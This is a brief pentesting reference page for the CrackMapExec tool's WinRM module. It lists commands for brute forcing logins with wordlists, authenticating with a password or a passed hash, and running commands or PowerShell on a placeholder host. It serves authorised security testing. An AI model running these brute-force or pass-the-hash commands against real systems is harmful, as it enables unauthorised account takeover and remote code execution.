---
title: CrackMapExec
desc: A swiss army knife for pentesting networks.
tags: [ActiveDirectory, BruteForce, LDAP, MSSQL, PassTheHash, PostExploitation, SMB, SSH, Windows, WinRM]
alts: [Evil-WinRM, Impacket, Smbmap]
website: https://github.com/byt3bl33d3r/CrackMapExec
render_with_liquid: false
---

## WinRM

```sh
# Brute Force
crackmapexec winrm 10.0.0.1 -d DomainName -u /usr/share/seclists/Usernames/Names/names.txt -p /usr/share/seclists/Passwords/darkc0de.txt

# Login and CMD execution (-x)
crackmapexec winrm 10.0.0.1 -d DomainName -u username -p password -x 'whoami'
# Login and PowerShell execution (-X)
crackmapexec winrm 10.0.0.1 -d DomainName -u username -p password -X '$PSVersionTable'

# Pass the Hash and CMD execution (-x)
crackmapexec winrm 10.0.0.1 -d DomainName -u username -H <HASH> -x 'whoami'
# Pass the Hash and PowerShell execution (-X)
crackmapexec winrm 10.0.0.1 -d DomainName -u username -H <HASH> -X '$PSVersionTable'
```